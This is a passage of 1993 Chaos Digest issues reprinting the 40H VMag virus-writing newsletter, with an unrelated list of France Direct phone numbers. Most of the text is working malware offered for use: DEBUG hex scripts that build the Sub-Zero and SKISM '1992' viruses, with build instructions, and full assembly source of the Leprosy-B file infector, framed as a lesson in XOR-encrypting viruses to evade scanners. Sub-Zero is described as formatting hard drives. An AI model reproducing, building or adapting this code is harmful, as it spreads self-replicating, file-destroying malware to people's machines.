e 0680  B4 40 CD 21 72 11 3B C1 75 18 8B 16 7C 00 8B 0E
e 0690  7E 00 B8 00 42 CD 21 72 09 33 D2 B9 10 07 B4 40
e 06A0  CD 21 2E 83 3E 8F 00 00 74 04 B4 49 CD 21 2E 83
e 06B0  3E 70 00 FF 74 31 2E 8B 1E 70 00 2E 8B 16 74 00
e 06C0  2E 8B 0E 76 00 B8 01 57 CD 21 B4 3E CD 21 2E C5
e 06D0  16 80 00 2E 8B 0E 72 00 B8 01 43 CD 21 2E C5 16
e 06E0  1B 00 B8 24 25 CD 21 07 1F 5F 5E 5A 59 5B 58 9D
e 06F0  2E FF 2E 17 00 00 00 00 00 00 00 00 00 00 00 00
e 0700  4D 9F 19 00 10 00 00 00 45 44 00 45 4C 00 00 00
e 0710  E9 92 00 DA AA A3 AA D4 3A A3 00 01 23 31 00 00
e 0720  00 02 00 04 01 64 30 A0 06 55 2E 56 05 9F 19 A5
e 0730  3E 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 06
e 0740  0E 97 30 80 00 00 00 80 00 97 30 5C 00 97 30 6C
e 0750  00 97 30 00 40 46 63 F4 1D D0 5C 00 00 46 00 4D
e 0760  5A A0 01 39 00 B4 02 AF 00 7C 04 7C A4 FA 05 10
e 0770  07 84 19 C5 00 FA 05 1C 00 00 00 00 00 00 00 00
e 0780  05 00 20 00 21 00 28 02 00 02 10 00 90 6A 00 00
e 0790  B9 41 2A 97 4C 4F 52 44 20 53 4B 49 53 4D 20 01
e 07A0  00 00 00 00 00 FC B4 E0 CD 21 3D 00 E0 73 16 80
e 07B0  FC 03 72 11 BF 00 01 B4 DD BE 10 07 03 F7 2E 8B
e 07C0  8D 11 00 CD 21 8C C8 04 10 00 8E D0 BC 00 07 50
e 07D0  B8 C5 00 50 CB 06 FC 2E 8C 06 31 00 2E 8C 06 39
e 07E0  00 2E 8C 06 3D 00 2E 8C 06 41 00 8C C0 05 10 00
e 07F0  2E 01 06 49 00 2E 01 06 45 00 B4 E0 CD 21 80 FC
e 0800  E0 73 13 80 FC 03 07 2E 8E 16 45 00 2E 8B 26 43
e 0810  CD 20 A3 AA D4 3A A3 1A 1A 1A 1A 1A 1A 1A 1A 1A

rcx
717
w
q
----------------------------------------------------------------------------

Sub-Zero is a memory resident COM and EXE infector that is based somewhat on
on Jerusalem-B.  It is the ansestor to the virus Captian Trips
which at this time has not been nailed by SCAN.

Be carefull because this virus will most likly format you hard drive if you
run it on the wrong day.  One day of the year it will perform a HD format.
I think it's in June, hmmmm...  D-Day rings a bell.

As of Scan-77 this virus can not be detected by SCAN or F-Prot.

                                                                           HR

------------------------------

End of Chaos Digest #1.25
************************************

Chaos Digest             Lundi 17 Mai 1993        Volume 1 : Numero 26
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.26 (17 Mai 1993)
File 1--40H VMag Issue 1 Volume 1 #004-6 (reprint)
File 2--France Direct vs Home Direct (repertoire)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 1 #004-6 (reprint)


40H Vmag Issue 1 Volume 1                                               00004

                     - SIMPLE ENCRYPTION METHODS -


    Encryption is perhaps one of the key parts of writing a virus.  If you
have a virus that prints a message to the screen, you don't want infected
files to contain that message.

    One easy way to encrypt data is the XOR method.  XOR is a matamatical
function that can be used to cifer and decifer data with the same key.

Example --

              FF  xor  A1  =  5E
byte to encrypt^       ^key   ^result

and likewise

              5E  xor  A1  =  FF

So as you can see an easy way to encrypt/decrypt sensitve data is with the
XOR function.

A popular virus that demonstrates this teqnique is Leprosy-B.  By studing
the below example you are on the way to make simple encrypted viruses.

----------------------------------------------------------------------------

;   -   Leprosy-B Virus Source
;                     Copy-ya-right (c) 1990 by PCM2.
;
;This file is the source code to the Leprosy-B virus.  It should
;be assembled with an MASM-compatible assembler; it has been tested
;and assembles correctly with both MASM 4.0 and Turbo Assembler 1.0.
;It should be made into a .COM file before executing, with either
;the "/t" command line flag in TLINK or Microsoft's EXE2BIN utility.
;
;This program has the potential to permanently destroy executable
;images on any disk medium.  Other modifications may have been made
;subsequent to the original release by the author, either benign,
;or which could result in further harm should this program be run.
;In any case, the author assumes no responsibility for any damage
;caused by this program, incidental or otherwise.  As a precaution,
;this program should not be turned over to irresponsible hands...
;(unlike people like us, that is).


                title   "Leprosy-B Virus by PCM2, August 1990"

cr              equ     13          ;Carriage return ASCII code
lf              equ     10          ;Linefeed ASCII code
tab             equ     9           ;Tab ASCII code
virus_size      equ     666         ;Size of the virus file
code_start      equ     100h        ;Address right after PSP in memory
dta             equ     80h         ;Addr of default disk transfer area
datestamp       equ     24          ;Offset in DTA of file's date stamp
timestamp       equ     22          ;Offset in DTA of file's time stamp
filename        equ     30          ;Offset in DTA of ASCIIZ filename
attribute       equ     21          ;Offset in DTA of file attribute


        code    segment 'code'      ;Open code segment
        assume  cs:code,ds:code     ;One segment for both code & data
                org     code_start  ;Start code image after PSP

;---------------------------------------------------------------------
;  All executable code is contained in boundaries of procedure "main".
;  The following code, until the start of "virus_code", is the non-
;  encrypted CMT portion of the code to load up the real program.
;---------------------------------------------------------------------
main    proc    near                ;Code execution begins here
        call    encrypt_decrypt     ;Decrypt the real virus code
        jmp     random_mutation     ;Put the virus into action

encrypt_val     db      00h         ;Hold value to encrypt by here

; ----------  Encrypt, save, and restore the virus code  -----------
infect_file:
        mov     bx,handle           ;Get the handle
        push    bx                  ;Save it on the stack
        call    encrypt_decrypt     ;Encrypt most of the code
        pop     bx                  ;Get back the handle
        mov     cx,virus_size       ;Total number of bytes to write
        mov     dx,code_start       ;Buffer where code starts in memory
        mov     ah,40h              ;DOS write-to-handle service
        int     21h                 ;Write the virus code into the file
        call    encrypt_decrypt     ;Restore the code as it was
        ret                         ;Go back to where you came from

; ---------------  Encrypt or decrypt the virus code  ----------------
encrypt_decrypt:
        mov     bx,offset virus_code;Get address to start encrypt/decrypt
xor_loop:                           ;Start cycle here
        mov     ah,[bx]             ;Get the current byte
        xor     ah,encrypt_val      ;Engage/disengage XOR scheme on it
        mov     [bx],ah             ;Put it back where we got it
        inc     bx                  ;Move BX ahead a byte
        cmp     bx,offset virus_code+virus_size  ;  Are we at the end?
        jle     xor_loop            ;If not, do another cycle
        ret                         ;and go back where we came from

;-----------------------------------------------------------------------
;   The rest of the code from here on remains encrypted until run-time,
;   using a fundamental XOR technique that changes via CMT.
;-----------------------------------------------------------------------
virus_code:

;----------------------------------------------------------------------------
;  All strings are kept here in the file, and automatically encrypted.
;  Please don't be a lamer and change the strings and say you wrote a virus.
;  Because of Cybernetic Mutation Technology(tm), the CRC of this file often
;  changes, even when the strings stay the same.
;----------------------------------------------------------------------------
exe_filespec   db "*.EXE",0
com_filespec   db "*.COM",0
newdir         db "..",0
fake_msg       db cr,lf,"Program too big to fit in memory$"
virus_msg1     db cr,lf,tab,"ATTENTION!  Your computer has been afflicted
with$"
virus_msg2     db cr,lf,tab,"the incurable decay that is the fate wrought by$"
virus_msg3     db cr,lf,tab,"Leprosy Strain B, a virus employing Cybernetic$"
virus_msg4     db cr,lf,tab,"Mutation Tech. (tm) and invented by PCM2 08/90.$"
compare_buf    db 20 dup (?)      ;  Buffer to compare files in
files_found    db ?
files_infected db ?
orig_time      dw ?
orig_date      dw ?
orig_attr      dw ?
handle         dw ?
success        db ?

random_mutation:                      ;First decide if virus is to mutate
        mov     ah,2ch                ;Set up DOS function to get time
        int     21h
        cmp     encrypt_val,0         ;Is this a first-run virus copy?
        je      install_val           ;If so, install whatever you get.
        cmp     dh,15                 ;Is it less than 16 seconds?
        jg      find_extension        ;If not, don't mutate this time
install_val:
        cmp     dl,0                  ;Will we be encrypting using zero?
        je      random_mutation       ;If so, get a new value.
        mov     encrypt_val,dl        ;Otherwise, save the new value
find_extension:                       ;Locate file w/ valid extension
        mov     files_found,0         ;Count infected files found
        mov     files_infected,4      ;BX counts file infected so far
        mov     success,0
find_exe:
        mov     cx,00100111b          ;Look for all flat file attributes
        mov     dx,offset exe_filespec;Check for .EXE extension first
        mov     ah,4eh                ;Call DOS find first service
        int     21h
        cmp     ax,12h                ;Are no files found?
        je      find_com              ;If not, nothing more to do
        call    find_healthy          ;Otherwise, try to find healthy .EXE
find_com:
        mov     cx,00100111b          ;Look for all flat file attributes
        mov     dx,offset com_filespec;Check for .COM extension now
        mov     ah,4eh                ;Call DOS find first service
        int     21h
        cmp     ax,12h                ;Are no files found?
        je      chdir                 ;If not, step back a directory
        call    find_healthy          ;Otherwise, try to find healthy .COM
chdir:                                ;Routine to step back one level
        mov     dx,offset newdir      ;Load DX with address of pathname
        mov     ah,3bh                ;Change directory DOS service
        int     21h
        dec     files_infected        ;This counts as infecting a file
        jnz     find_exe              ;If we're still rolling, find another
        jmp     exit_virus            ;Otherwise let's pack it up
find_healthy:
        mov     bx,dta                ;Point BX to address of DTA
        mov     ax,[bx]+attribute     ;Get the current file's attribute
        mov     orig_attr,ax          ;Save it
        mov     ax,[bx]+timestamp     ;Get the current file's time stamp
        mov     orig_time,ax          ;Save it
        mov     ax,[bx]+datestamp     ;Get the current file's data stamp
        mov     orig_date,ax          ;Save it
        mov     dx,dta+filename       ;Get the filename to change attribute
        mov     cx,0                  ;Clear all attribute bytes
        mov     al,1                  ;Set attribute sub-function
        mov     ah,43h                ;Call DOS service to do it
        int     21h
        mov     al,2                  ;Set up to open handle for read/write
        mov     ah,3dh                ;Open file handle DOS service
        int     21h
        mov     handle,ax             ;Save the file handle
        mov     bx,ax                 ;Transfer the handle to BX for read
        mov     cx,20                 ;Read in the top 20 bytes of file
        mov     dx,offset compare_buf ;Use the small buffer up top
        mov     ah,3fh                ;DOS read-from-handle service
        int     21h
        mov     bx,offset compare_buf ;Adjust the encryption value
        mov     ah,encrypt_val        ;for accurate comparison
        mov     [bx+6],ah
        mov     si,code_start         ;One array to compare is this file
        mov     di,offset compare_buf ;The other array is the buffer
        mov     ax,ds                 ;Transfer the DS register...
        mov     es,ax                 ;...to the ES register
        cld
        repe    cmpsb                 ;Compare the buffer to the virus
        jne     healthy               ;If different, the file is healthy!
        call    close_file            ;Close it up otherwise
        inc     files_found           ;Chalk up another fucked up file
continue_search:
        mov     ah,4fh                ;Find next DOS function
        int     21h                   ;Try to find another same type file
        cmp     ax,12h                ;Are there any more files?
        je      no_more_found         ;If not, get outta here
        jmp     find_healthy          ;If so, try the process on this one!
no_more_found:
        ret                           ;Go back to where we came from
healthy:
        mov     bx,handle             ;Get the file handle
        mov     ah,3eh                ;Close it for now
        int     21h
        mov     ah,3dh                ;Open it again, to reset it
        mov     dx,dta+filename
        mov     al,2
        int     21h
        mov     handle,ax             ;Save the handle again
        call    infect_file           ;Infect the healthy file
        call    close_file            ;Close down this operation
        inc     success               ;Indicate we did something this time
        dec     files_infected        ;Scratch off another file on agenda
        jz      exit_virus            ;If we're through, terminate
        jmp     continue_search       ;Otherwise, try another
        ret
close_file:
        mov     bx,handle             ;Get the file handle off the stack
        mov     cx,orig_time          ;Get the date stamp
        mov     dx,orig_date          ;Get the time stamp
        mov     al,1                  ;Set file date/time sub-service
        mov     ah,57h                ;Get/Set file date and time service
        int     21h                   ;Call DOS
        mov     bx,handle
        mov     ah,3eh                ;Close handle DOS service
        int     21h
        mov     cx,orig_attr          ;Get the file's original attribute
        mov     al,1                  ;Instruct DOS to put it back there
        mov     dx,dta+filename       ;Feed it the filename
        mov     ah,43h                ;Call DOS
        int     21h
        ret
exit_virus:
        cmp     files_found,6         ;Are at least 6 files infected?
        jl      print_fake            ;If not, keep a low profile
        cmp     success,0             ;Did we infect anything?
        jg      print_fake            ;If so, cover it up
        mov     ah,09h                ;Use DOS print string service
        mov     dx,offset virus_msg1  ;Load the address of the first line
        int     21h                   ;Print it
        mov     dx,offset virus_msg2  ;Load the second line
        int     21h                   ;(etc)
        mov     dx,offset virus_msg3
        int     21h
        mov     dx,offset virus_msg4
        int     21h
        jmp     terminate
print_fake:
        mov     ah,09h                ;Use DOS to print fake error message
        mov     dx,offset fake_msg
        int     21h
terminate:
        mov     ah,4ch                ;DOS terminate process function
        int     21h                   ;Call DOS to get out of this program

filler          db       8 dup (90h)  ;Pad out the file length to 666 bytes

main    endp
code    ends
        end     main

----------------------------------------------------------------------------

While the virus is no great wonder the simple encryption method is what is
used by almost all viruses.

                                                                          HR

+++++

40H Vmag Issue 1 Volume 1                                               00005

                             - 1992 VIRUS -


Heres another for you virus fiends.  Its been labled 1992, the latest in the
line of viruses brought to you by SKISM.

While the virus is no groundbreaker - the graphic display that is given by
the virus will go down in history as the first of it's kind.

Copy the below to a file called  1992.USR then execute --

                       DEBUG < 1992.USR

------------------------------------------------------------------------------
n 1992.com
e 0100  EB 02 90 02 E8 03 00 E9 E7 05 51 BB 38 01 8A 2F
e 0110  32 2E 03 01 88 2F 43 81 FB 00 09 7E F1 59 C3 BA
e 0120  00 01 8B 1E E5 06 53 E8 E0 FF 5B B9 C8 07 B4 40
e 0130  CD 21 53 E8 D4 FF 5B C3 0D 10 1B 00 08 B1 1B 04
e 0140  C1 18 22 C6 BD 1B 01 B1 1B 15 B1 1B 01 1A 1B 00
e 0150  C1 18 04 C6 DB 02 B3 B3 14 18 19 B3 10 DF 22 22
e 0160  08 B1 1B 01 C1 18 0C C6 C0 18 05 C6 C3 C6 BD 22
e 0170  22 1A 1B 00 B1 1B 06 02 B3 B3 14 18 1D B3 10 DF
e 0180  22 08 C2 C6 C6 C0 C6 DB 1B 0C B1 1B 0B B1 22 22
e 0190  1A 1B 00 B1 1B 01 02 B3 B3 14 18 23 B3 10 DF 1B
e 01A0  00 08 B1 1B 12 B1 1B 0B C2 C6 C6 1A 1B 00 B1 1B
e 01B0  00 02 B3 B3 14 18 21 B3 10 DF 22 13 1B 06 0B DC
e 01C0  10 22 13 22 DC 10 22 13 22 DC 10 22 13 22 DC 10
e 01D0  22 13 1B 06 DC 10 22 13 22 22 DC 10 22 22 13 22
e 01E0  22 DC 10 22 22 1A 1B 00 08 B1 22 22 02 B3 B3 14
e 01F0  18 0A B3 0D 18 1A B3 02 10 DF 14 B3 B3 B3 10 DF
e 0200  13 22 0B DC 02 10 18 06 B3 13 22 0B DC 22 DC 02
e 0210  10 B3 B3 13 22 0B DC 02 10 B3 13 22 0B DC 02 10
e 0220  18 06 B3 13 22 0B DC 22 DC 22 DC 22 DC 02 10 B3
e 0230  22 1A 1B 00 08 B1 22 22 02 B3 B3 14 18 05 B3 0D
e 0240  18 1B B3 02 10 DF 22 22 14 B3 10 DF 13 1B 06 0B
e 0250  DC 10 22 13 22 22 DC 02 10 B3 22 22 13 22 0B DC
e 0260  02 10 B3 13 1B 06 0B DC 10 22 13 22 DC 02 10 B3
e 0270  13 22 0B DC 02 10 B3 13 22 0B DC 02 10 B3 22 1A
e 0280  08 C6 C6 C0 DB 22 22 02 B3 B3 14 18 05 B3 0D 18
e 0290  0E B3 12 1B 05 14 18 01 B3 02 10 DF 1B 00 08 B1
e 02A0  22 22 02 B3 B3 B3 13 22 0B DC 02 10 B3 13 22 0B
e 02B0  DC 22 DC 02 10 B3 22 13 22 0B DC 02 10 B3 22 B3
e 02C0  B3 B3 13 22 0B DC 02 10 B3 13 22 0B DC 02 10 B3
e 02D0  22 B3 B3 13 22 0B DC 02 10 B3 22 1A 22 22 08 B1
e 02E0  1B 00 02 B3 B3 14 18 05 B3 0D 18 0E B3 12 DC D9
e 02F0  D9 02 14 B3 B3 B0 B0 0D 12 D9 14 B3 B3 B3 02 10
e 0300  DF 1B 01 08 B1 22 13 1B 06 0B DC 02 10 B3 13 22
e 0310  0B DC 02 10 B3 13 22 0B DC 02 10 B3 13 22 0B DC
e 0320  02 10 B3 13 1B 06 0B DC 02 10 B3 13 22 0B DC 02
e 0330  10 B3 1B 00 13 22 0B DC 02 10 B3 22 1A 22 22 08
e 0340  B1 1B 00 02 B3 B3 14 18 05 B3 0D 18 0E B3 12 DC
e 0350  D9 D9 02 14 B3 B3 B3 B0 0D 12 D9 14 B3 B3 02 10
e 0360  DF 1B 06 08 B1 22 22 02 18 07 B3 22 B3 B3 22 B3
e 0370  B3 22 B3 B3 22 18 07 B3 22 B3 B3 1B 00 B3 B3 B3
e 0380  22 1A 22 22 08 B1 1B 00 02 B3 B3 14 18 01 B3 0D
e 0390  B3 B3 B3 02 B3 0D 18 0E B3 12 DC 18 07 D9 14 B3
e 03A0  B3 02 10 DF 1B 01 08 D8 C6 DB 1B 18 D8 C6 C6 C6
e 03B0  BD 22 22 1A 22 22 B1 1B 01 02 B3 B3 14 B3 B3 B3
e 03C0  0D 18 18 B3 02 10 DF 1B 00 08 C1 18 04 C6 C0 18
e 03D0  16 C6 DB 1B 00 B1 22 22 1A 22 22 C1 18 01 C6 BD
e 03E0  02 B3 B3 0D 14 18 1F B3 02 10 DF 22 22 08 B1 1B
e 03F0  07 16 22 0D 14 56 16 6A 67 22 6F 63 6C 22 75 6A
e 0400  6D 22 60 70 6D 77 65 6A 76 22 7B 6D 77 22 10 22
e 0410  22 08 B1 22 22 1A 22 22 B1 1B 01 B1 02 B3 B3 0D
e 0420  14 18 1E B3 02 10 DF 1B 00 08 B1 1B 01 02 B3 B3
e 0430  16 22 0D 34 30 30 2E 22 51 69 6B 71 6F 22 4D 6C
e 0440  67 2E 22 41 63 72 76 6B 63 6C 22 10 22 22 08 B1
e 0450  22 22 1A 22 22 B1 1B 01 B1 02 B3 B3 0D 14 18 10
e 0460  B3 02 10 DF 0D 14 18 05 B3 02 10 DF 1B 01 08 B1
e 0470  1B 01 02 B3 B3 16 22 0D 56 70 6B 72 71 2E 22 63
e 0480  6C 66 22 51 77 60 2F 58 67 70 6D 22 6C 6D 75 22
e 0490  10 22 22 08 B1 22 22 1A 22 22 B1 1B 01 B1 02 B3
e 04A0  B3 0D 14 18 10 B3 02 10 DF 1B 01 08 B1 1B 05 B1
e 04B0  1B 01 02 B3 B3 16 22 0D 71 6A 63 6C 69 71 22 7B
e 04C0  6D 77 22 63 65 63 6B 6C 2E 22 22 75 6B 76 6A 22
e 04D0  10 22 22 08 C2 C6 C6 1A 22 22 B1 1B 01 B1 02 B3
e 04E0  B3 0D 14 18 10 B3 02 10 DF 1B 01 08 C2 C6 C6 BD
e 04F0  1B 06 C1 C6 BD 22 22 02 B3 B3 16 22 0D 6A 6B 71
e 0500  22 6E 63 76 67 71 76 2C 2C 2C 1B 08 10 1B 06 1A
e 0510  22 22 08 C2 C6 C6 C0 C6 C3 02 B3 B3 0D 14 18 11
e 0520  B3 02 10 DF 1B 07 08 B1 1B 06 B1 22 B1 22 22 02
e 0530  18 1A B3 1B 04 1A 1B 06 08 B1 22 22 02 B3 B3 0D
e 0540  14 18 15 B3 02 10 DF 22 22 08 B1 1B 06 B1 22 C2
e 0550  18 1E C6 BD 1B 01 1A C6 C6 C0 C6 C6 DB 22 22 02
e 0560  B3 B3 0D 14 18 14 B3 02 10 DF 1B 00 08 C1 C6 C6
e 0570  C6 C0 C6 DB 1B 07 17 22 0C 51 69 6B 71 6F 22 33
e 0580  3B 3B 30 22 2F 22 54 6B 70 77 71 18 01 23 22 10
e 0590  22 08 C1 18 01 C6 1A 22 22 B1 1B 06 02 B3 B3 0D
e 05A0  14 18 0A B3 02 10 DF 1B 0A 08 D8 18 04 C6 DB 1B
e 05B0  00 B1 1B 07 02 B3 B3 17 1B 01 0D 45 67 76 22 63
e 05C0  22 6E 63 76 67 22 72 63 71 71 23 1B 01 10 22 08
e 05D0  B1 1B 01 1A D8 C6 DB 1B 00 02 B3 B3 0D 11 18 09
e 05E0  D9 14 D9 D9 12 DF 10 1B 07 08 B1 1B 08 B1 1B 07
e 05F0  02 18 1A B3 22 22 08 B1 1B 01 1A B1 22 02 B3 B3
e 0600  0D 11 18 19 D9 02 10 DF 1B 05 08 B1 1B 11 D8 18
e 0610  09 C6 DB 1B 01 1A 02 B3 B3 0D 12 18 22 D9 DF 10
e 0620  1B 06 08 B1 1B 11 B1 1B 12 1A 0D 12 18 21 D9 DF
e 0630  10 1B 01 08 C2 18 11 C6 DB 1B 12 1A 28 02 28 2C
e 0640  47 5A 47 02 5E 02 01 3D 3D 3D 3D 3D 3D 3D 3D 22
e 0650  22 22 11 01 02 02 02 28 D3 EF 48 13 68 7B D4 14
e 0660  02 02 02 02 46 4D 51 02 22 22 22 22 02 02 02 02
e 0670  02 01 3D 3D 3D 3D 3D 3D 3D 3D 47 5A 47 05 07 02
e 0680  23 02 28 D3 EF 48 22 2A 00 23 02 00 02 02 02 56
e 0690  43 50 45 47 50 2C 47 5A 47 02 02 02 95 32 44 04
e 06A0  73 04 95 32 02 56 47 4F 52 02 02 02 02 02 02 02
e 06B0  02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02
e 06C0  02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02
e 06D0  02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02
e 06E0  02 02 02 02 02 07 02 2A 00 23 02 22 02 CF 22 02
e 06F0  02 BA 02 32 CF 23 3E 01 70 29 B6 2E CF 23 8A 14
e 0700  01 03 B6 28 CF 23 82 F8 1B 7E 06 3E 07 76 01 E9
e 0710  77 92 BC 3A 03 BA 02 BA 8C C2 BD 02 02 BB 06 07
e 0720  EA 07 02 E9 FC EB 88 02 E1 59 89 D5 31 C2 FE AE
e 0730  3E 22 70 07 A9 E0 FA E9 4E 3E 12 71 05 82 E6 F2
e 0740  08 E2 E9 F3 3E 1A 76 11 71 1B 2E 12 00 C2 00 C2
e 0750  00 C2 00 C2 82 E6 8D 08 E2 E9 D8 83 C0 A2 02 89
e 0760  F8 E9 D0 3E 19 70 05 77 CE 82 F6 82 E9 C5 3E 1B
e 0770  89 DB AE 88 CA B2 22 76 00 AE 49 30 EF 43 F1 A9
e 0780  89 C9 4B E2 A8 C1 B8 44 04 B6 18 CF 23 B6 1B CF
e 0790  23 88 D2 FC C0 B6 45 BC A7 04 CF 23 B8 46 04 B6
e 07A0  39 CF 23 BB 11 02 B8 3E 04 B6 4C CF 23 3F 10 02
e 07B0  77 01 E9 53 92 B6 4D CF 23 3F 10 02 76 45 B8 66
e 07C0  04 B6 39 CF 23 B6 2D CF 23 8E 04 9E 04 8B 1C 9C
e 07D0  04 B8 73 04 B6 18 CF 23 BB 05 02 B8 3C 04 B6 4C
e 07E0  CF 23 3F 10 02 77 23 B6 4D CF 23 3F 10 02 77 1A
e 07F0  B8 46 04 B6 39 CF 23 B6 18 8C 1C 9E 04 89 14 9C
e 0800  04 CF 23 E9 B2 E9 7B 92 B6 2D CF 23 8E 04 A0 04
e 0810  8B 1C A2 04 B8 8D 04 B9 73 04 89 45 1A A1 EB 04
e 0820  89 45 14 A1 E5 04 89 45 17 BA 02 41 CF 23 8B 0C
e 0830  E9 04 BA 03 41 31 CB CF 23 BA 02 3F CF 23 70 21
e 0840  A1 E7 04 B6 3D 89 1C E7 04 BB 00 02 B8 EF 04 CF
e 0850  23 B6 3C 89 1C E7 04 CF 23 89 1C EF 04 83 F9 E9
e 0860  00 77 0D B6 18 8C 1C A0 04 89 14 A2 04 CF 23 EB
e 0870  77 FD B8 8D 04 BA 00 3F CF 23 A1 E7 04 EA 9D FA
e 0880  BA 03 55 89 1C E7 04 89 0C E5 04 89 14 EB 04 CF
e 0890  23 BA 03 41 89 0C E9 04 B8 8D 04 CF 23 B6 39 B8
e 08A0  46 04 CF 23 B6 39 B8 A7 04 CF 23 BA 02 4E CF 23
e 08B0  4F 61 43 64 67 67 22 75 70 6D 76 67 22 55 6A 63
e 08C0  6E 67 23 23 23 23 23 23 1A 1A 1A 1A 1A 1A 1A 1A

rcx
7C8
w
q

----------------------------------------------------------------------------

The virus only infects systems running DOS 3.0 and up.  It is non-resident
will only infect disks with more than two directorys.  When the virus is
run it will seek out the first EXE file in the second directory from the
root.  Each run after that will begin infection of files following.  The
virus will jump from directory to directory when executed until it finds
an uninfected EXE file to nail.

On the last Friday of the month the virus will display a full color, full
screen message to all.

                                                                          HR

+++++

40H Vmag Issue 1 Volume 1                                              00006

I think this magazine will be monthly, keep looking for it.

Next Issue -

             Spotlight on Vienna
             Editoral on virus speed
             Article on Whale and if I can find it Whale source code.

             plus

             More viruses, more source code and more insight...

------------------------------

From: jbcondat@attmail.com (Chaos Computer Club France )
Date: 05 May 93 23:59:59 GMT
Subject: File 2--France Direct vs Home Direct (repertoire)
Repost from: telecom13.303.3@eecs.nwu.edu


The France Direct service offer to all cardholders the possibility to
obtain directly and freely a French operator from some foreign
countries. The price of the phone call begin as soon as the
correspondant begin the call.

Call the following France Direct phone numbers from:

                 Normal User           Automatic version
                                       Carte Pastel Intl.' users

Allemagne        0130 80 00 33
Argentine        0033 800 999 111
Australie        00 14 881 330
Autriche         022 903 033
Belgique                               078 11 00 33
Bresil           0008 033
Canada           1800 363 40 33        1800 463 62 26
Chine                                  108 33
Colombie         980 33 0057           980 33 00 10
Coree (Rep)                            009 0330
Danemark         800 100 33
Emirats Arab     800 1 9971
Espagne          900 99 00 33
Etats-Unis       800 537 2623          800 47 372 623
                 800 937 2623          800 872 7835
                                       800 727 8350
Finlande         98 00 10 330
Gabon            00 033
Hongrie          00 800 033 11
Hong-Kong        800 00 33             800 10 33
Irlande          800 55 10 33          800 55 00 33
Israel           177 330 2727
Italie           172 00 33
Japon            00 39 331             00 31 00 55 33
Luxembourg                             0 800 00 33
Malaisie                               800 00 33
Norvege          050 19933
Nouvelle-Zelande 000 9 33
Pays-Bas         06 022 2033           06 022 2533
Portugal         0505 00 33
Royaume-Uni      0800 890033
Singapour        800 33 00             800 33 11
Suede            02 07 99 033          02 07 99 133
Tchecoslovaquie  00 42 00 3301
Turquie          99 800 33 11 77

For the foreign people visiting France, some phone call exist in France for
a quick and direct access to local facilities:

Algerie          19 00 213
Allemagne        19 00 49
Argentine        19 00 54
Australie        19 00 61
Autriche         19 00 43
Belgique         19 00 32
Bresil           19 00 55
Canada           19 00 16
Colombie         19 00 57
Coree (Rep)      19 00 82
Danemark         19 00 45
EmiratsArabes    19 00 971
Espagne          19 00 34
Etats-Unis       19 00 11 (AT&T)
                 19 00 19 (MCI)
                 19 00 87 (Sprint)
Finlande         19 00 358
Gabon            19 00 241
Hong-Kong        19 00 852             19 02 852
Hongrie          19 00 36
Irlande          19 00 353
Italie           19 00 39
Japon            19 00 81              19 02 81
Luxembourg       19 00 352
Norvege          19 00 47
Nouvelle-Zelande 19 00 64
Pays-Bas         19 00 31
Portugal         19 00 351
Royaume-Uni      19 00 44
Singapour        19 00 65
Suede            19 00 46
Turquie          19 00 90

------------------------------

End of Chaos Digest #1.26
************************************

Chaos Digest           Mercredi 19 Mai 1993        Volume 1 : Numero 27
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.27 (19 Mai 1993)
File 1--40H VMag Issue 1 Volume 2 #000-5(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
